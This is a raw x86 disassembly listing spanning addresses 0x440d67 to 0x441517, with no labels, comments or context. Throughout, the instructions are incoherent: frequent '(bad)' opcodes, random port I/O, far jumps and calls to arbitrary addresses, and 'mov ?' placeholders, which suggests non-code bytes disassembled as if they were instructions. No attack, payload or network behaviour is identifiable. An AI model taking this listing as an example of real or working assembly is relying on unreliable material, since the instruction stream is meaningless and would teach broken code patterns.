  440d67:	or     BYTE PTR [ebx-0x51],0xbd
  440d6b:	xor    bl,BYTE PTR [edi+0x35]
  440d6e:	jl     0x440dbf
  440d70:	js     0x440d19
  440d72:	es jno 0x440ddf
  440d75:	cmp    eax,0x299da154
  440d7a:	shr    BYTE PTR [esi],0x64
  440d7d:	leave  
  440d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440d7f:	ins    DWORD PTR es:[edi],dx
  440d80:	add    BYTE PTR fs:[ecx-0x767ed116],dl
  440d87:	fidiv  DWORD PTR [edi-0x18]
  440d8a:	inc    esi
  440d8b:	adc    DWORD PTR [edi+0x61],esp
  440d8e:	mov    esp,0x84428706
  440d93:	jbe    0x440d42
  440d95:	xchg   edi,eax
  440d96:	out    dx,al
  440d97:	(bad)  
  440d98:	in     al,dx
  440d99:	jmp    0x440d1e
  440d9b:	mov    esp,0xcbba4eef
  440da0:	or     BYTE PTR [eax],al
  440da2:	rcl    BYTE PTR [esi+edi*2+0x21],1
  440da6:	fistp  WORD PTR [eax+0x3c]
  440da9:	pop    esi
  440daa:	pusha  
  440dab:	in     al,0x59
  440dad:	mov    eax,ds:0x1076fbea
  440db2:	add    ch,al
  440db4:	nop
  440db5:	cdq    
  440db6:	xchg   ecx,eax
  440db7:	xchg   ecx,eax
  440db8:	lea    esi,[eax-0x3b0de97a]
  440dbe:	bound  ebx,QWORD PTR [edx-0x611e55a2]
  440dc4:	dec    edx
  440dc5:	inc    esi
  440dc6:	pushf  
  440dc7:	retf   0x60ff
  440dca:	mov    ds:0x9811f376,eax
  440dcf:	or     eax,0x60ee69f7
  440dd4:	or     eax,0xce4bec51
  440dd9:	ins    BYTE PTR es:[edi],dx
  440dda:	push   cs
  440ddb:	mov    eax,ds:0xc371554c
  440de0:	dec    edx
  440de1:	dec    esp
  440de2:	xor    DWORD PTR [esi],esi
  440de4:	pop    edi
  440de5:	cmp    BYTE PTR [ebx-0x75],bh
  440de8:	repz inc ecx
  440dea:	cmp    eax,DWORD PTR [ecx-0x5e71ca88]
  440df0:	jno    0x440de0
  440df2:	data16 aaa 
  440df4:	cdq    
  440df5:	sbb    eax,0xee5b3bed
  440dfa:	cmp    al,0x6
  440dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440dfd:	push   esi
  440dfe:	mov    ?,WORD PTR [edi+0x75]
  440e01:	xchg   edx,eax
  440e02:	or     DWORD PTR [ebp+0x617b48ee],0xffffff91
  440e09:	sbb    bh,cl
  440e0b:	ja     0x440d95
  440e0d:	pop    esi
  440e0e:	mov    esi,0xee0d8db4
  440e13:	aas    
  440e14:	fdiv   QWORD PTR [ebp+0x14]
  440e17:	or     eax,0xa0f10d46
  440e1c:	adc    al,0xd9
  440e1e:	or     al,0x31
  440e20:	sbb    DWORD PTR [eax+0x56a6579],0xffffffee
  440e27:	clc    
  440e28:	adc    eax,0x7858a09c
  440e2d:	call   0x61ad02c9
  440e32:	jnp    0x440e89
  440e34:	jp     0x440df3
  440e36:	mov    eax,0xeef63cac
  440e3b:	adc    al,0x6c
  440e3d:	dec    esi
  440e3e:	test   eax,edi
  440e40:	dec    edi
  440e41:	mov    BYTE PTR ds:0xf6612e29,cl
  440e47:	xchg   edi,eax
  440e48:	sbb    ebp,DWORD PTR [edx-0x5d]
  440e4b:	mov    esp,0x8ff30ff7
  440e50:	jae    0x440eaf
  440e52:	mov    ecx,0xbf72b0f0
  440e57:	fldcw  WORD PTR [edi+0xf502360]
  440e5d:	jo     0x440eae
  440e5f:	dec    ecx
  440e60:	adc    DWORD PTR ss:[ecx+0x45695eef],eax
  440e67:	jmp    0x440e24
  440e69:	shl    BYTE PTR [ecx],cl
  440e6b:	cmp    eax,0x95532e67
  440e70:	dec    esp
  440e71:	aad    0xfc
  440e73:	and    BYTE PTR [esi-0x36],bl
  440e76:	(bad)  
  440e77:	daa    
  440e78:	mov    bl,0x54
  440e7a:	add    DWORD PTR [edx-0x10],edi
  440e7d:	push   cs
  440e7e:	hlt    
  440e7f:	in     eax,dx
  440e80:	inc    edi
  440e81:	cwde   
  440e82:	clc    
  440e83:	push   edi
  440e84:	pop    esi
  440e85:	imul   ecx,DWORD PTR [edx-0x2f],0xffffff98
  440e89:	pop    ecx
  440e8a:	mov    ebp,0x68dccca1
  440e8f:	add    eax,DWORD PTR [bp+si+0x3c]
  440e93:	pop    ebp
  440e94:	mov    esp,0x8f34eea5
  440e99:	loopne 0x440f19
  440e9b:	and    BYTE PTR [ecx+0x13a0c75d],ah
  440ea1:	rcl    DWORD PTR ds:0x5b35f117,0x5e
  440ea9:	call   0x32cf27f8
  440eae:	daa    
  440eaf:	mov    cl,0x16
  440eb1:	jae    0x440ef4
  440eb3:	mov    BYTE PTR [ecx],ch
  440eb5:	popa   
  440eb6:	or     eax,0xaafa0e57
  440ebb:	mov    WORD PTR [esi+0x32],ds
  440ebe:	push   edx
  440ebf:	in     al,0x75
  440ec1:	test   BYTE PTR [ebp-0x1a9f09b1],bh
  440ec7:	popf   
  440ec8:	cmp    al,0x38
  440eca:	sbb    ebx,esp
  440ecc:	enter  0xeea3,0xf7
  440ed0:	test   al,0x3f
  440ed2:	stos   DWORD PTR es:[edi],eax
  440ed3:	adc    al,0x76
  440ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440ed6:	mov    esp,0x2dd117a0
  440edb:	or     eax,0xfbd41979
  440ee0:	pop    esi
  440ee1:	sti    
  440ee2:	or     eax,0xe2ce917a
  440ee7:	les    edi,FWORD PTR [esi+0x60]
  440eea:	dec    edx
  440eeb:	out    0x26,al
  440eed:	xchg   edx,eax
  440eee:	repnz xchg esi,eax
  440ef0:	popa   
  440ef1:	lahf   
  440ef2:	add    bh,ah
  440ef4:	stc    
  440ef5:	ret    
  440ef6:	out    dx,al
  440ef7:	(bad)  
  440ef8:	lock repnz xor eax,0x3b60af6c
  440eff:	mov    al,0x4e
  440f01:	push   eax
  440f02:	push   eax
  440f03:	test   eax,0x13ee1276
  440f08:	xor    eax,0xf772c2b2
  440f0d:	iret   
  440f0e:	push   cs
  440f0f:	mov    eax,ds:0x7d204107
  440f14:	mov    ah,0x1b
  440f16:	loopne 0x440f4c
  440f18:	addr16 xchg esp,eax
  440f1a:	cmp    al,0xe7
  440f1c:	lahf   
  440f1d:	mov    esi,DWORD PTR [eax-0x68]
  440f20:	(bad)  
  440f21:	gs inc ebp
  440f23:	xlat   BYTE PTR ds:[ebx]
  440f24:	adc    bl,ah
  440f26:	out    dx,al
  440f27:	push   ebx
  440f28:	aas    
  440f29:	mov    ecx,esp
  440f2b:	fdivr  DWORD PTR [ebx]
  440f2d:	scas   al,BYTE PTR es:[edi]
  440f2e:	arpl   WORD PTR [ecx-0x6a448a85],sp
  440f34:	dec    edx
  440f35:	pop    ebx
  440f36:	int    0xe7
  440f38:	xor    eax,0x5eef4379
  440f3d:	fmul   st(2),st
  440f3f:	inc    edx
  440f40:	pop    es
  440f41:	jmp    0x440fb2
  440f43:	inc    ebp
  440f44:	div    DWORD PTR [eax]
  440f46:	retf   
  440f47:	test   BYTE PTR [edi+0x61],cl
  440f4a:	pusha  
  440f4b:	(bad)  
  440f4c:	out    dx,eax
  440f4d:	inc    ecx
  440f4e:	(bad)  
  440f4f:	test   DWORD PTR [ebx+0x55],0x6e11ccee
  440f56:	les    esp,FWORD PTR [edi-0x5eb78cc6]
  440f5c:	pop    es
  440f5d:	or     al,0x2d
  440f5f:	daa    
  440f60:	cmp    esp,ebx
  440f62:	mov    esp,0x74665e03
  440f67:	lea    esp,[esi]
  440f69:	mov    al,0xb
  440f6b:	cmp    cl,dh
  440f6d:	adc    al,0x1a
  440f6f:	xchg   ebp,eax
  440f70:	push   esi
  440f71:	add    DWORD PTR [ecx-0x161a430a],esi
  440f77:	cld    
  440f78:	jmp    0xde7ed4be
  440f7d:	jbe    0x440f0c
  440f7f:	enter  0x5dfe,0xc1
  440f83:	scas   eax,DWORD PTR es:[edi]
  440f84:	sub    dl,BYTE PTR [edx]
  440f86:	cmp    eax,0x1eef85e2
  440f8b:	push   ecx
  440f8c:	dec    esp
  440f8d:	dec    ebp
  440f8e:	out    dx,al
  440f8f:	pop    ebp
  440f90:	sahf   
  440f91:	and    DWORD PTR [ebx],ebp
  440f93:	mov    ebp,0xa16a2c6c
  440f98:	or     al,0xa5
  440f9a:	jl     0x440fe7
  440f9c:	pop    ss
  440f9d:	rcl    cl,1
  440f9f:	rcr    BYTE PTR [esi-0x4f],1
  440fa2:	jmp    0x8505:0xcb363335
  440fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440faa:	ins    BYTE PTR es:[edi],dx
  440fab:	mov    al,ds:0x20237b00
  440fb0:	ds das 
  440fb2:	fwait
  440fb3:	pop    edx
  440fb4:	sti    
  440fb5:	retf   0x78f0
  440fb8:	test   BYTE PTR [eax],ah
  440fba:	push   edx
  440fbb:	inc    ecx
  440fbc:	out    dx,al
  440fbd:	sub    al,0x6
  440fbf:	outs   dx,DWORD PTR ds:[esi]
  440fc0:	push   eax
  440fc1:	pop    edx
  440fc2:	test   BYTE PTR [ebp+0x71ab3279],al
  440fc8:	loopne 0x441047
  440fca:	call   0x52d0:0xee74d679
  440fd1:	or     esi,edi
  440fd3:	icebp  
  440fd4:	or     al,BYTE PTR [ebx+edx*8-0x60]
  440fd8:	mov    BYTE PTR [esi-0x41fab995],ah
  440fde:	mov    edi,0x11aef37
  440fe3:	mov    dh,0xc0
  440fe5:	sub    al,0xae
  440fe7:	ins    DWORD PTR es:[edi],dx
  440fe8:	push   ebx
  440fe9:	mov    bh,0x85
  440feb:	mov    BYTE PTR [edi+0x1dddd060],dh
  440ff1:	jg     0x44104b
  440ff3:	pop    esi
  440ff4:	inc    esi
  440ff5:	stos   BYTE PTR es:[edi],al
  440ff6:	jecxz  0x440fae
  440ff8:	push   ebx
  440ff9:	ret    0xac37
  440ffc:	push   ds
  440ffd:	pop    esp
  440ffe:	mov    esi,0x1dfbde8f
  441003:	mov    eax,ds:0x40a3f4ca
  441008:	sbb    eax,0x5b87886e
  44100d:	mov    ch,0x5e
  44100f:	dec    ebx
  441010:	jle    0x440fd9
  441012:	inc    edi
  441013:	and    eax,0xace8dafd
  441018:	mov    cl,BYTE PTR [ebx-0x16]
  44101b:	mov    al,ds:0x2621f92f
  441020:	dec    ebx
  441021:	inc    esi
  441022:	cli    
  441023:	(bad)  
  441024:	pop    esi
  441025:	arpl   WORD PTR [esi],ax
  441027:	add    ah,bl
  441029:	mov    eax,0x60c502c3
  44102e:	fwait
  44102f:	popa   
  441030:	js     0x44106b
  441032:	shr    DWORD PTR [ebp-0xb],1
  441035:	out    dx,al
  441036:	and    eax,0x6b5fdec6
  44103b:	scas   al,BYTE PTR es:[edi]
  44103c:	push   ebp
  44103d:	retf   
  44103e:	jne    0x44109d
  441040:	mov    fs,WORD PTR [ebp+0x1e]
  441043:	mov    eax,ds:0x8ce5a1ec
  441048:	adc    DWORD PTR [bx+si],0x6d0e5e24
  44104f:	pusha  
  441050:	popf   
  441051:	push   0xffffffaf
  441053:	pop    ss
  441054:	in     al,0x5d
  441056:	test   BYTE PTR [eax+0x6e39e5fa],dh
  44105c:	fimul  WORD PTR [esi+0x5d5d990d]
  441062:	push   ebp
  441063:	sbb    eax,0xd5bd7aac
  441068:	sahf   
  441069:	(bad)  
  44106a:	out    0xa0,al
  44106c:	mov    BYTE PTR [ebp+0x5f],ch
  44106f:	adc    al,0xc5
  441071:	dec    edx
  441072:	sbb    cl,bl
  441074:	push   esp
  441075:	mov    DWORD PTR [edx+0x59125eec],esi
  44107b:	xchg   edx,eax
  44107c:	xchg   BYTE PTR [ecx],bh
  44107e:	mov    edx,0x109f6d99
  441083:	jnp    0x441063
  441085:	out    0x5,al
  441087:	xor    dl,BYTE PTR [ecx]
  441089:	ins    DWORD PTR es:[edi],dx
  44108a:	out    dx,al
  44108b:	mov    ebx,DWORD PTR [eax-0x22aef8]
  441091:	sar    DWORD PTR [eax+ebp*4+0x70],1
  441095:	cmc    
  441096:	lds    esp,FWORD PTR [ecx-0xd]
  441099:	xor    BYTE PTR ds:0xebc6e9c4,ah
  44109f:	(bad)  
  4410a0:	data16 jbe 0x4410be
  4410a3:	dec    ebx
  4410a4:	fadd   st(0),st
  4410a6:	das    
  4410a7:	fwait
  4410a8:	mov    ebp,0x346cca60
  4410ad:	pop    ebp
  4410ae:	ja     0x44112a
  4410b0:	sub    al,0xef
  4410b2:	lock push edi
  4410b4:	push   ss
  4410b5:	je     0x44109e
  4410b7:	inc    eax
  4410b8:	xchg   edx,eax
  4410b9:	nop
  4410ba:	cmp    BYTE PTR [ebp-0x62],dh
  4410bd:	pusha  
  4410be:	test   DWORD PTR [ebx],eax
  4410c0:	push   esi
  4410c1:	pop    ebx
  4410c2:	jp     0x4410f4
  4410c4:	arpl   WORD PTR [esi+ebp*8+0x26],ax
  4410c8:	outs   dx,BYTE PTR ds:[esi]
  4410c9:	fsubrp st(0),st
  4410cb:	ins    BYTE PTR es:[edi],dx
  4410cc:	or     ch,bl
  4410ce:	leave  
  4410cf:	mov    al,ds:0x242d714c
  4410d4:	out    dx,eax
  4410d5:	repz cmp edi,ebx
  4410d8:	pop    ebp
  4410d9:	(bad)  
  4410db:	iret   
  4410dc:	enter  0xa32f,0x18
  4410e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4410e1:	mov    al,ds:0xf0710f78
  4410e6:	xchg   DWORD PTR [esi+ebp*4+0x6815ee43],ebp
  4410ed:	adc    esi,DWORD PTR [ecx+0x23ca7444]
  4410f3:	add    DWORD PTR [esi+0x61],ecx
  4410f6:	mov    dl,0xee
  4410f8:	ins    BYTE PTR es:[edi],dx
  4410f9:	sbb    BYTE PTR [eax],dh
  4410fb:	jae    0x441096
  4410fd:	pusha  
  4410fe:	test   BYTE PTR [ebx],dh
  441100:	int    0xb7
  441102:	in     al,0x18
  441104:	(bad)  
  441105:	sbb    esp,edi
  441107:	adc    DWORD PTR [eax+edx*1+0x3d8efae1],0x6150439b
  441112:	dec    ecx
  441113:	not    DWORD PTR [ebx-0x6fe68387]
  441119:	jbe    0x4410d1
  44111b:	sub    DWORD PTR [edx+0x5e],edi
  44111e:	adc    eax,0xb2c1d4a0
  441123:	add    BYTE PTR [edx-0x3b5e05fd],bl
  441129:	es aaa 
  44112b:	cs sti 
  44112d:	call   0x48e0c2a6
  441132:	in     eax,dx
  441133:	and    BYTE PTR [esi],ah
  441135:	sbb    eax,0x9c2477b
  44113a:	xor    eax,0x840e7aef
  44113f:	out    dx,eax
  441140:	out    0x60,al
  441142:	jg     0x4410e0
  441144:	ins    BYTE PTR es:[edi],dx
  441145:	push   esp
  441146:	(bad)  
  441147:	scas   eax,DWORD PTR es:[edi]
  441148:	adc    al,0x2f
  44114a:	out    dx,al
  44114b:	pop    ebp
  44114c:	add    BYTE PTR [edi-0x14],dh
  44114f:	gs (bad) 
  441151:	push   ecx
  441152:	outs   dx,DWORD PTR ds:[esi]
  441153:	mov    ds:0x3b84f424,eax
  441158:	add    bh,bl
  44115a:	cs in  al,dx
  44115c:	les    esp,FWORD PTR [ecx-0x12]
  44115f:	sbb    BYTE PTR ds:0xa6d7f474,cl
  441165:	push   ss
  441166:	push   edx
  441167:	test   al,0x1a
  441169:	out    dx,eax
  44116a:	aad    0x4b
  44116c:	aaa    
  44116d:	popf   
  44116e:	frstor [eax-0x52]
  441171:	les    ebp,FWORD PTR [edx]
  441173:	pop    ss
  441174:	pop    esi
  441175:	ja     0x441136
  441177:	lea    edx,ds:[edi+0x77]
  44117b:	dec    edi
  44117c:	stos   DWORD PTR es:[edi],eax
  44117d:	lock sub ah,BYTE PTR [ecx-0xbdd7aea]
  441184:	ret    
  441185:	inc    esp
  441186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441187:	dec    eax
  441188:	pop    esi
  441189:	push   0xb9ce143e
  44118e:	loopne 0x441115
  441190:	sti    
  441191:	pop    edi
  441192:	pusha  
  441193:	adc    eax,0x916c1ce6
  441198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441199:	test   BYTE PTR [eax],dl
  44119b:	stc    
  44119c:	pop    esi
  44119d:	mov    eax,DWORD PTR [esp+esi*2]
  4411a0:	mov    esp,0xf550a4b
  4411a5:	pop    esi
  4411a6:	mov    ss,WORD PTR [ecx]
  4411a8:	pop    ebp
  4411a9:	sbb    DWORD PTR [eax],esp
  4411ab:	ret    
  4411ac:	xchg   BYTE PTR [esp+ebp*1],cl
  4411af:	push   ecx
  4411b0:	pop    esi
  4411b1:	sahf   
  4411b2:	lea    edi,[edx+ebp*8]
  4411b5:	jns    0x441187
  4411b7:	(bad)  
  4411b8:	and    eax,0x6b7c0861
  4411bd:	fsub   DWORD PTR [ebp-0x113043b8]
  4411c3:	retf   0x6068
  4411c6:	pop    edx
  4411c7:	retf   0xf3f9
  4411ca:	lahf   
  4411cb:	mov    eax,ds:0x455622a7
  4411d0:	jg     0x4411c0
  4411d2:	and    ch,BYTE PTR [esi-0x3cda4ea2]
  4411d8:	into   
  4411d9:	push   edi
  4411da:	imul   ecx
  4411dc:	pop    es
  4411dd:	dec    edx
  4411de:	das    
  4411df:	retf   0x52a6
  4411e2:	repz xchg esp,eax
  4411e4:	mov    ebx,0xa740e34b
  4411e9:	inc    edi
  4411ea:	(bad)  
  4411ec:	push   ecx
  4411ed:	std    
  4411ee:	sub    edx,edx
  4411f0:	fninit 
  4411f2:	sub    eax,0xbb63ae78
  4411f7:	iret   
  4411f8:	js     0x44125a
  4411fa:	aaa    
  4411fb:	mov    ch,0x22
  4411fd:	pusha  
  4411fe:	add    DWORD PTR [ebx-0x31],edi
  441201:	(bad)  
  441202:	out    dx,eax
  441203:	sub    DWORD PTR [ebx-0x6adc474e],eax
  441209:	jp     0x44127e
  44120b:	cmp    dh,dh
  44120d:	pop    edx
  44120e:	cs lahf 
  441210:	mov    ds:0x2e9a9b60,eax
  441215:	(bad)  
  441217:	cmp    BYTE PTR [esi],dl
  441219:	das    
  44121a:	in     eax,dx
  44121b:	out    dx,eax
  44121c:	idiv   edx
  44121e:	inc    ebp
  44121f:	lods   al,BYTE PTR ds:[esi]
  441220:	jne    0x4411a3
  441222:	pop    edx
  441223:	dec    ebx
  441224:	cmp    al,0x61
  441226:	loopne 0x441252
  441228:	jecxz  0x441297
  44122a:	lock dec ebx
  44122c:	jo     0x4411b0
  44122e:	lock mov DWORD PTR [edi],ebx
  441231:	clc    
  441232:	mov    dl,0xc0
  441234:	imul   BYTE PTR [ecx+edx*2-0x50]
  441238:	aaa    
  441239:	es int3 
  44123b:	lods   al,BYTE PTR ds:[esi]
  44123c:	icebp  
  44123d:	test   bh,ah
  44123f:	lea    esi,[ecx]
  441241:	add    al,0x67
  441243:	icebp  
  441244:	ja     0x4411d2
  441246:	inc    ebp
  441247:	call   FWORD PTR [esi+0x2c]
  44124a:	or     BYTE PTR [ebx-0x3ea37da8],al
  441250:	cmp    bl,BYTE PTR [edx+0x59]
  441253:	inc    esi
  441254:	or     bl,dh
  441256:	push   edx
  441257:	loope  0x44129a
  441259:	mov    al,ds:0x1c7c5863
  44125e:	out    dx,al
  44125f:	sub    ch,BYTE PTR [edi]
  441261:	not    BYTE PTR [edi+0x7]
  441264:	mov    dh,0xd9
  441266:	cli    
  441267:	mov    al,ds:0x6b211045
  44126c:	jnp    0x441236
  44126e:	push   ecx
  44126f:	fs pop esi
  441271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441272:	mov    esp,0xc8b16da9
  441277:	bound  edi,QWORD PTR [ebx-0x21bfe8ab]
  44127d:	shl    esi,cl
  44127f:	sbb    al,BYTE PTR [edx-0x3fe013f8]
  441285:	or     al,0x11
  441287:	add    ch,bl
  441289:	loopne 0x44122b
  44128b:	and    ch,BYTE PTR [edi]
  44128d:	(bad)  
  44128e:	hlt    
  44128f:	mov    al,ds:0x99efcead
  441294:	sbb    BYTE PTR [edx+edi*2],dl
  441297:	daa    
  441298:	pop    esi
  441299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44129a:	imul   eax,DWORD PTR [ecx],0xffffffcc
  44129d:	pop    edx
  44129e:	ret    0xbdaa
  4412a1:	pop    esi
  4412a2:	jge    0x441281
  4412a4:	out    dx,eax
  4412a5:	(bad)  
  4412a6:	retf   
  4412a7:	aad    0x9e
  4412a9:	mov    cs,WORD PTR [ecx+0x291c5e6e]
  4412af:	and    al,0xf0
  4412b1:	movhps xmm4,QWORD PTR [esi]
  4412b4:	outs   dx,BYTE PTR ds:[esi]
  4412b5:	sub    BYTE PTR [eax],bh
  4412b7:	lahf   
  4412b8:	sub    ebx,edx
  4412ba:	sub    al,BYTE PTR [edx]
  4412bc:	inc    BYTE PTR [esi]
  4412be:	mov    ebx,0xee21336c
  4412c3:	adc    DWORD PTR [esi-0x7f3cbdae],ebx
  4412c9:	or     DWORD PTR [esi+0x1a954da2],esp
  4412cf:	sub    edi,esi
  4412d1:	leave  
  4412d2:	mov    al,ds:0x1f58705d
  4412d7:	dec    ebx
  4412d8:	popa   
  4412d9:	loope  0x4412af
  4412db:	add    dl,BYTE PTR [edi-0x3d29ea49]
  4412e1:	push   ebp
  4412e2:	iret   
  4412e3:	or     al,0x23
  4412e5:	cld    
  4412e6:	out    dx,al
  4412e7:	aam    0xca
  4412e9:	xchg   ebx,eax
  4412ea:	pop    ebx
  4412eb:	xlat   BYTE PTR ds:[ebx]
  4412ec:	jmp    0x4412a8
  4412ee:	out    dx,al
  4412ef:	pop    esi
  4412f0:	mov    ecx,?
  4412f2:	jmp    0x7212ca2c
  4412f7:	mov    eax,ds:0x203c6834
  4412fc:	data16 out dx,al
  4412fe:	xchg   esp,eax
  4412ff:	push   esi
  441300:	pop    esi
  441301:	mov    edx,0xfe507480
  441306:	sbb    eax,0x3f606cdd
  44130b:	pop    eax
  44130c:	xor    al,0x3
  44130e:	inc    eax
  44130f:	push   cs
  441310:	xchg   ebp,eax
  441311:	sbb    ch,dh
  441313:	mov    ?,WORD PTR [ebx+ecx*1-0x43]
  441317:	out    0xb8,eax
  441319:	or     al,0xa
  44131b:	mov    eax,ds:0x624b70a6
  441320:	scas   al,BYTE PTR es:[edi]
  441321:	pop    esp
  441322:	pop    edx
  441323:	or     bl,BYTE PTR [edi-0x68]
  441326:	adc    BYTE PTR [esi-0x7effded1],cl
  44132c:	jle    0x44130e
  44132e:	mov    cl,0xa0
  441330:	lds    eax,FWORD PTR [edi]
  441332:	jg     0x441318
  441334:	stos   DWORD PTR es:[edi],eax
  441335:	cmp    edx,DWORD PTR [ebx]
  441337:	enter  0x9a5b,0xed
  44133b:	sub    eax,0xb51d348f
  441340:	jne    0x441352
  441342:	push   esi
  441343:	data16 lahf 
  441345:	pop    esi
  441346:	and    ecx,DWORD PTR [edi+0x31302c88]
  44134c:	sahf   
  44134d:	fild   WORD PTR [ecx]
  44134f:	push   es
  441350:	pop    edx
  441351:	sbb    ecx,DWORD PTR [eax-0x5c3ddab8]
  441357:	and    DWORD PTR [ebx-0x15],esp
  44135a:	jle    0x441326
  44135c:	clc    
  44135d:	cmp    esi,ebp
  44135f:	inc    eax
  441360:	addr16 xchg ebp,eax
  441362:	sar    DWORD PTR [esi],1
  441364:	fwait
  441365:	and    dl,bl
  441367:	out    dx,eax
  441368:	jb     0x4413ae
  44136a:	add    edi,DWORD PTR [ebp+0x6030e0d0]
  441370:	xchg   ebx,eax
  441371:	lahf   
  441372:	popf   
  441373:	dec    edx
  441374:	pop    esi
  441375:	ds jne 0x441330
  441378:	dec    ebx
  441379:	gs popa 
  44137b:	leave  
  44137c:	sub    al,0x2d
  44137e:	clc    
  44137f:	mov    al,ds:0xbb9700f0
  441384:	or     ch,BYTE PTR [esi+0x4f]
  441387:	dec    ebp
  441388:	pusha  
  441389:	cmp    DWORD PTR [ebx+0x7d300488],edi
  44138f:	cmp    DWORD PTR [eax+0xb],0xcc5ca411
  441396:	mov    esi,0x9e4aa376
  44139b:	mov    ch,0xe6
  44139d:	inc    edi
  44139e:	out    dx,al
  44139f:	gs mov edi,0xf66a35e7
  4413a5:	imul   ebp,DWORD PTR [ebx-0x5c],0xffffffc2
  4413a9:	data16 jecxz 0x44136a
  4413ac:	lahf   
  4413ad:	aaa    
  4413ae:	out    dx,al
  4413af:	es jg  0x44140c
  4413b2:	mov    ecx,0xe5646d01
  4413b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4413b8:	push   cs
  4413b9:	dec    edx
  4413ba:	mul    BYTE PTR [ecx-0x64]
  4413bd:	repnz outs dx,BYTE PTR ds:[esi]
  4413bf:	push   es
  4413c0:	xlat   BYTE PTR ds:[ebx]
  4413c1:	xlat   BYTE PTR ds:[ebx]
  4413c2:	or     DWORD PTR [ecx+0x1f9c3fff],esp
  4413c8:	rcl    DWORD PTR ds:0xab5d5cf0,1
  4413ce:	out    dx,eax
  4413cf:	xchg   esi,eax
  4413d0:	mov    eax,0x6edd8c34
  4413d5:	cmp    BYTE PTR [ebp+0x1f3f48a0],ch
  4413db:	cmp    eax,0xb103436
  4413e0:	fs push es
  4413e2:	pushf  
  4413e3:	xchg   esp,eax
  4413e4:	div    BYTE PTR [ecx-0x6d]
  4413e7:	shr    DWORD PTR [eax+0x47],0x8a
  4413eb:	std    
  4413ec:	fs popa 
  4413ee:	sbb    al,BYTE PTR [esi-0x32736a5f]
  4413f4:	add    BYTE PTR [ecx],cl
  4413f6:	out    dx,al
  4413f7:	icebp  
  4413f8:	cdq    
  4413f9:	mov    ecx,0xb18dd80a
  4413fe:	mov    ax,ds:0x61ec32fd
  441404:	push   es
  441405:	jb     0x441472
  441407:	aas    
  441408:	pop    esi
  441409:	mov    eax,DWORD PTR [ebx-0x55]
  44140c:	ss add al,0xa1
  44140f:	inc    edx
  441410:	fsubp  st(0),st
  441412:	jb     0x4413b5
  441414:	inc    BYTE PTR [ebp+0x7f]
  441417:	mov    ebx,0xc2391e0b
  44141c:	pop    esi
  44141d:	xlat   BYTE PTR ss:[ebx]
  44141f:	daa    
  441420:	sub    BYTE PTR [edi+edi*1-0x31],ah
  441424:	mov    eax,ds:0x728b1d44
  441429:	ret    0x60f1
  44142c:	test   al,cl
  44142e:	lds    edi,FWORD PTR [eax+edx*8]
  441431:	mov    dh,ch
  441433:	bound  ecx,QWORD PTR [ebx]
  441435:	xor    esi,DWORD PTR ds:[edx-0x57]
  441439:	and    eax,0x21d2a0c8
  44143e:	test   ebx,edx
  441440:	and    eax,0x5d33e04a
  441445:	pop    edi
  441446:	pop    edi
  441447:	mov    DWORD PTR [esi+0x19],eax
  44144a:	loope  0x4414a7
  44144c:	mov    al,ds:0x4a12379d
  441451:	sbb    eax,0xd5597aae
  441456:	mov    eax,ss:0xfe0ac550
  44145c:	push   es
  44145d:	lods   al,BYTE PTR ds:[esi]
  44145e:	mov    ecx,0x381f32f5
  441463:	and    ebp,edi
  441465:	dec    edi
  441466:	pop    eax
  441467:	mov    ds:0xa13f5985,eax
  44146c:	sar    dh,1
  44146e:	in     eax,dx
  44146f:	jno    0x44142c
  441471:	mov    bl,0xb3
  441473:	sbb    DWORD PTR [esi+0x64],0x86525cd
  44147a:	in     al,0xa5
  44147c:	ret    
  44147d:	pusha  
  44147e:	mov    bh,0x94
  441480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441481:	jmp    0xcf2b47cf
  441486:	out    dx,al
  441487:	adc    DWORD PTR [ebx],esp
  441489:	dec    edx
  44148a:	in     al,dx
  44148b:	cmc    
  44148c:	test   BYTE PTR [eax+0x64],al
  44148f:	mov    eax,ds:0xf2ffeceb
  441494:	scas   al,BYTE PTR es:[edi]
  441495:	sar    BYTE PTR [ecx-0x18ef13e3],0x13
  44149c:	inc    ebx
  44149d:	sub    DWORD PTR [eax+ecx*4+0x7e],0xe69d7881
  4414a5:	je     0x441442
  4414a7:	and    eax,0xb56d60f2
  4414ac:	xor    esi,ebx
  4414ae:	dec    ebx
  4414af:	nop
  4414b0:	pop    esi
  4414b1:	popf   
  4414b2:	adc    DWORD PTR [ecx+eiz*4],ebp
  4414b5:	jmp    0x44145e
  4414b7:	push   ebp
  4414b8:	or     eax,0x239d6160
  4414bd:	adc    edx,edx
  4414bf:	or     dl,BYTE PTR gs:[ecx-0x329befc4]
  4414c6:	jo     0x4414d1
  4414c8:	arpl   WORD PTR [ecx+0x2eaa7224],ax
  4414ce:	clc    
  4414cf:	mov    al,ds:0xf41c79d9
  4414d4:	pop    ds
  4414d5:	ins    BYTE PTR es:[edi],dx
  4414d6:	js     0x44145b
  4414d8:	cmc    
  4414d9:	cld    
  4414da:	and    al,0xcc
  4414dc:	pop    ecx
  4414dd:	popa   
  4414de:	scas   al,BYTE PTR es:[edi]
  4414df:	and    edx,ecx
  4414e1:	lock mov bl,0xd8
  4414e4:	jbe    0x441546
  4414e6:	(bad)  
  4414e7:	dec    ebx
  4414e8:	out    dx,eax
  4414e9:	inc    edx
  4414ea:	jge    0x4414a9
  4414ec:	sahf   
  4414ed:	mov    ebp,esi
  4414ef:	btc    DWORD PTR [esi+ecx*1-0x56],0x98
  4414f5:	std    
  4414f6:	sahf   
  4414f7:	mov    eax,ds:0x46dfa5f4
  4414fc:	or     bl,BYTE PTR [ebx+0x7f5e69d5]
  441502:	cmp    al,0x97
  441504:	mov    edx,0x3172e0e
  441509:	pop    edx
  44150a:	xchg   ebx,eax
  44150b:	int3   
  44150c:	fdiv   QWORD PTR [eax+ebx*4-0x2f]
  441510:	mov    DWORD PTR [ecx+0x29],esi
  441513:	in     eax,dx
  441514:	scas   al,BYTE PTR es:[edi]
  441515:	or     esi,edi
  441517:	inc    esi
